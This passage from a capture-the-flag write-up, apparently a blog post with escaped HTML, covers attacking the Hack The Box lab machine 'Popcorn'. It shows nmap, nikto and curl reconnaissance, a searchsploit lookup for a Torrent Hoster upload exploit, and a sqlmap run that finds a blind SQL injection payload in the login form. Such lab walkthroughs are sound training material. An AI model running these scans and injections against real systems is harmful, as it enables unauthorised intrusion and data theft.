Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.17 - 2.6.36 (95%), Linux 2.6.32 (95%), Linux 2.6.35 (95%), Linux 2.4.20 (Red Hat 7.2) (95%), Linux 2.6.17 (95%), Linux 2.6.30 (95%), AVM FRITZ!Box FON WLAN 7240 WAP (94%), Canon imageRUNNER ADVANCE C3320i or C3325 copier (94%), Android 2.3.5 (Linux 2.6) (94%), Epson WF-2660 printer (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   39.30 ms 10.10.14.1
2   39.38 ms 10.10.10.6&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Two open ports don’t seem like a lot, but one of them is HTTP. Time for some analysis&lt;/p&gt;

&lt;h2 id=&quot;triage&quot;&gt;Triage&lt;/h2&gt;

&lt;p&gt;Immediately I’m reluctant to look at the SSH service as it’s behind authentication. I’ll park that for later and look at the web app.&lt;/p&gt;

&lt;p&gt;At this point most folks break out dirbuster or go buster, but we’ll crack on with nmap.
I set a fast time scan with 20 parallel channels to run the http-enum directories and files against Popcorn on port 80&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--max-parallelism&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;20 &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http-enum &lt;span class=&quot;nv&quot;&gt;$POPCORN&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 80&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;within a few seconds I get the following:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;Nmap scan report for 10.10.10.6
Host is up (0.045s latency).
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /test/: Test page
|   /test.php: Test page
|   /test/logon.html: Jetty
|_  /icons/: Potentially interesting folder w/ directory listing&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This uses a default wordlist with common directories and filenames.
Useful to get started with for general analysis, but we want to dig deeper.&lt;/p&gt;

&lt;p&gt;When dealing with web apps I like to spider into directories using a directory wordlist from dirbuster called &lt;strong&gt;directory-list-2.3-medium.txt&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;This file is larger than the basic enum scripts available with nmap, but not so large that it will take forever to complete.&lt;/p&gt;

&lt;p&gt;Nmap’s http-enum script uses the resources of the nikto web scanner to perform its enumeration, and while most folks break out a scan with dirbuster or gobuster, I usually follow up nmap scanning with nikto and move to ZAP with dirbuster if I have to use something with a GUI.&lt;/p&gt;

&lt;p&gt;Nikto can perform a dir enum via the following command:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nikto &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$POPCORN&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-mutate&lt;/span&gt; 6 &lt;span class=&quot;nt&quot;&gt;-mutate-options&lt;/span&gt; directory-list-2.3-medium.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The mutate option is on the deprecate hit-list for this tool, as an alternate we can specify the attack vector via a plugin mode:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nikto &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$POPCORN&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Plugins&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;@@DEFAULT;dictionary(dictionary:/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt)&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Soon we begin to see a return:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;---------------------------------------------------------------------------
+ Target IP:          10.10.10.6
+ Target Hostname:    10.10.10.6
+ Target Port:        80
+ Start Time:         2020-02-11 21:19:24 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.2.12 (Ubuntu)
+ Server may leak inodes via ETags, header found with file /, inode: 43621, size: 177, mtime: Fri Mar 17 17:07:05 2017
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'tcn' found, with contents: choice
+ Found file /index
+ Retrieved x-powered-by header: PHP/5.2.10-2ubuntu6.10
+ Found file /test
+ Found file /torrent
+ Found file /rename&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Unlike some nmap scripts, nikto is non invasive. Without specifying a plugin/mutation the default operation provides ample information to add to our enumeration. Which we can trigger on specific directories with:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nikto &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$POPCORN&lt;/span&gt;/torrent/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We should take care to note however that weaknesses are the result of a light probing and are therefore not always accurate, any findings here will need a manual follow up.&lt;/p&gt;

&lt;p&gt;Back to the dir enum. As there are 220,000+ urls to check we’ll crack on with the manual analysis in a different terminal.&lt;/p&gt;

&lt;p&gt;/torrent and /rename are both interesting finds, lets cURL them:&lt;/p&gt;

&lt;p&gt;starting with rename we get a redirect, so I follow it:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;curl &lt;span class=&quot;nt&quot;&gt;-kiL&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$POPCORN&lt;/span&gt;/rename&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;to get:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;301&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;Moved Permanently&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Tue, 11 Feb 2020 21:29:13 GMT&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Apache/2.2.12 (Ubuntu)&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;http://10.10.10.6/rename/&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Vary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Accept-Encoding&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;309&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html; charset=iso-8859-1&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;HTTP/1.1 200 OK&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Tue, 11 Feb 2020 21:29:13 GMT&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Apache/2.2.12 (Ubuntu)&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;X-Powered-By&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;PHP/5.2.10-2ubuntu6.10&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Vary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Accept-Encoding&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;95&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Renamer API Syntax: index.php?filename=old_file_path_an_name&amp;amp;newfilename=new_file_path_and_name&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Interesting, a couple of variables that might allow us to do some file enumeration. I park this just now as I wonder if I can use it to read configs specified in the php.info() details from the /test URL.&lt;/p&gt;

&lt;p&gt;On to torrent, which also bounces me through a redirect but takes me to a full on webapp:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;curl &lt;span class=&quot;nt&quot;&gt;-kiL&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$POPCORN&lt;/span&gt;/torrent&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Just the headers this time:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;curl &lt;span class=&quot;nt&quot;&gt;-kIL&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$POPCORN&lt;/span&gt;/torrent&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Gives us:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;301&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;Moved Permanently&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Tue, 11 Feb 2020 21:40:47 GMT&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Apache/2.2.12 (Ubuntu)&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;http://10.10.10.6/torrent/&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Vary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Accept-Encoding&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html; charset=iso-8859-1&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;HTTP/1.1 200 OK&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Tue, 11 Feb 2020 21:40:47 GMT&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Apache/2.2.12 (Ubuntu)&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;X-Powered-By&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;PHP/5.2.10-2ubuntu6.10&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Set-Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;PHPSESSID=b0a2662beb823b3bc800b2b3723549b0; path=/&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Expires&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Thu, 19 Nov 1981 08:52:00 GMT&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Cache-Control&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;private&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Pragma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;no-cache&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Vary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Accept-Encoding&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;At this point we need to get the browser involved, spinning up FireFox I go to http://10.10.10.6/torrent/ to find a full fledged web app.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/KaliSetup/torrent_hoster.png&quot; alt=&quot;torrent_hoster.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From here I can interact with the site, even create a profile and register as a user.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/KaliSetup/make_user.png&quot; alt=&quot;make_user.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Because there is no email validation I can just login with the user I made!
At this point my triage begins to bear fruit as now I can interact with the website as an authenticated user.&lt;/p&gt;

&lt;p&gt;At this point I can begin to start looking for a way to exploit the system.&lt;/p&gt;

&lt;h2 id=&quot;exploit&quot;&gt;Exploit&lt;/h2&gt;

&lt;p&gt;First I’m going to look for known issues, checking searchsploit with:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;searchsploit torrent hoster&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;gives me a single exploit:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;-------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                            |  Path
                                                                          | (/usr/share/exploitdb/)
-------------------------------------------------------------------------- ----------------------------------------
Torrent Hoster - Remount Upload                                           | exploits/php/webapps/11746.txt
-------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;examining the exploit with&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;searchsploit &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; 11746&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It looks like there are a few syntax issues but the exploit suggests that we have a way to upload code execution. Since I have an authenticated user this could be the way in, but lets poke about to make sure the required components are there.&lt;/p&gt;

&lt;p&gt;I want a vanilla connection experience to debug this, so I logout first.&lt;/p&gt;

&lt;p&gt;Going through the exploit I see the following urls:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;torrenthoster/torrents.php?mode=upload&lt;/li&gt;
  &lt;li&gt;torrenthoster/upload.php&lt;/li&gt;
  &lt;li&gt;torrenthoster/torrents/&lt;/li&gt;
  &lt;li&gt;torrenthoster/users/forgot_password.php/&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Assuming torrenthoster is the root url for the webapp i change it to torrent and visit the following urls in the browser:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;http://10.10.10.6/torrent/torrents.php?mode=upload&lt;/li&gt;
  &lt;li&gt;http://10.10.10.6/torrent/upload.php&lt;/li&gt;
  &lt;li&gt;http://10.10.10.6/torrent/torrents/&lt;/li&gt;
  &lt;li&gt;http://10.10.10.6/torrent/users/forgot_password.php/&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;http://10.10.10.6/torrent/torrents.php?mode=upload bounces back to what looks like the index, I maybe need to be authenticated to view it.&lt;/p&gt;

&lt;p&gt;http://10.10.10.6/torrent/upload.php and http://10.10.10.6/torrent/torrents/ both return white empty pages in the browser, suggesting they load something but what? At this stage I can’t say.&lt;/p&gt;

&lt;p&gt;http://10.10.10.6/torrent/users/forgot_password.php/ returns a reset your password form page as expected&lt;/p&gt;

&lt;p&gt;Lets curl the pages:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;curl &lt;span class=&quot;nt&quot;&gt;-Ik&lt;/span&gt; http://&lt;span class=&quot;nv&quot;&gt;$POPCORN&lt;/span&gt;/torrent/torrents.php?mode&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;upload&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;returns:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;OK&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Tue, 11 Feb 2020 21:43:13 GMT&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Apache/2.2.12 (Ubuntu)&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;X-Powered-By&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;PHP/5.2.10-2ubuntu6.10&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Set-Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;PHPSESSID=21d435352fe9a2616b32bd5252003068; path=/&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Expires&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Thu, 19 Nov 1981 08:52:00 GMT&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Cache-Control&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;private&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Pragma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;no-cache&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Vary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Accept-Encoding&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I also returns a similar responses from the other urls, but no Cookie settings with&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;curl &lt;span class=&quot;nt&quot;&gt;-ik&lt;/span&gt; http://&lt;span class=&quot;nv&quot;&gt;$POPCORN&lt;/span&gt;/torrent/torrents/
curl &lt;span class=&quot;nt&quot;&gt;-ik&lt;/span&gt; http://&lt;span class=&quot;nv&quot;&gt;$POPCORN&lt;/span&gt;/torrent/upload.php&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;When I run the curl commands with the -i flags on those, /torrents/ returns the same details but:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;curl &lt;span class=&quot;nt&quot;&gt;-ik&lt;/span&gt; http://&lt;span class=&quot;nv&quot;&gt;$POPCORN&lt;/span&gt;/torrent/upload.php&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;gives me debugging page, which near the bottom leaks some useful information about the dB:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;b&amp;gt;&lt;/span&gt;Warning&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt;:  mysql_query() [&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'function.mysql-query'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;function.mysql-query&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;]: Access denied for user 'www-data'@'localhost' (using password: NO) in &lt;span class=&quot;nt&quot;&gt;&amp;lt;b&amp;gt;&lt;/span&gt;/var/www/torrent/upload.php&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; on line &lt;span class=&quot;nt&quot;&gt;&amp;lt;b&amp;gt;&lt;/span&gt;443&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;b&amp;gt;&lt;/span&gt;Warning&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt;:  mysql_query() [&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'function.mysql-query'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;function.mysql-query&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;]: A link to the server could not be established in &lt;span class=&quot;nt&quot;&gt;&amp;lt;b&amp;gt;&lt;/span&gt;/var/www/torrent/upload.php&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; on line &lt;span class=&quot;nt&quot;&gt;&amp;lt;b&amp;gt;&lt;/span&gt;443&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;b&amp;gt;&lt;/span&gt;Fatal error&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt;:  Call to undefined function sqlerr() in &lt;span class=&quot;nt&quot;&gt;&amp;lt;b&amp;gt;&lt;/span&gt;/var/www/torrent/upload.php&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; on line &lt;span class=&quot;nt&quot;&gt;&amp;lt;b&amp;gt;&lt;/span&gt;443&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now I know for sure that we are using MySQL, if I can get a sql injection I can try and exploit the server with sqlmap.&lt;/p&gt;

&lt;p&gt;back to the login page: http://10.10.10.6/torrent/login.php, viewing the source code for the form:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/KaliSetup/inputs.png&quot; alt=&quot;inputs.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I can pull out the 2 variables, username and password.
Using an attack proxy like ZAP I can follow the login process to failure and determine the POST method is used. This gives me the syntax:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://&lt;span class=&quot;nv&quot;&gt;$POPCORN&lt;/span&gt;/torrent/login.php &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;username=pwnd&amp;amp;password=pwnd&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--method&lt;/span&gt; POST &lt;span class=&quot;nt&quot;&gt;--dbms&lt;/span&gt; MySQL &lt;span class=&quot;nt&quot;&gt;--thread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5 &lt;span class=&quot;nt&quot;&gt;--tables&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;quickly the tool comes back with&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;[INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I up the level and risk to 1, but avoid following any redirects to get:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;[INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I can work with this to manually exploit if needed, I let the tests and eventually after trying a few different interactive options get the following results:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;sqlmap identified the following injection point(s) with a total of 380 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: username=pwnd' OR NOT 2740=2740#&amp;amp;password=pwnd
    Type: error-based
